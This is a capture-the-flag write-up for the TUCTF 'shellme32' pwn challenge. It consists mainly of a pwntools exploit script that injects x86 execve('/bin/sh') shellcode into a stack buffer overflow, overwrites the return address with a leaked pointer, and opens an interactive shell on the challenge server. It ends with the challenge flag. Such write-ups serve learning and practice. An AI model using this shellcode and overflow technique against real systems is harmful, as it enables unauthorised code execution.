# shellme32

## PWN - Points: 500

> One small step for hacker's, one giant leap for pwning kind.
>
> 
>
> nc chal.tuctf.com 30506
>
> [shellme32](shellme32)
>

Find x86 shellcode.

Exploit script:

```python
from pwn import *


shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# context.terminal = ['termite', '-e']
# p = gdb.debug('./shellme32')
# p = process('shellme32')
p = remote('chal.tuctf.com', 30506)

print p.recvline()
pointer = int(p.recvline()[:-1], 16)
print hex(pointer)

p.sendlineafter('> ', shellcode + 'A' * (40 - len(shellcode)) + p32(pointer))
p.interactive()
```

flag: `TUCTF{4www..._b4by5_f1r57_3xpl017._h0w_cu73}`